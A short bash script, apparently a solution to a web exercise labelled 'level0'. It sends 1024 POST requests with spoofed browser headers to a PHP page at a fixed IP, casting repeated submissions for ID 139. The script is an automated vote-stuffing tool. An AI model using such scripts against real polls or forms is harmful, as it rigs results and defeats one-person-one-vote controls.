#!/bin/bash
for i in {1..1024}; do
    curl 'http://158.69.76.135/level0.php' \
-XPOST \
-H 'Origin: http://158.69.76.135' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Referer: http://158.69.76.135/level0.php' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8' \
--data 'id=139&holdthedoor=Submit'
done
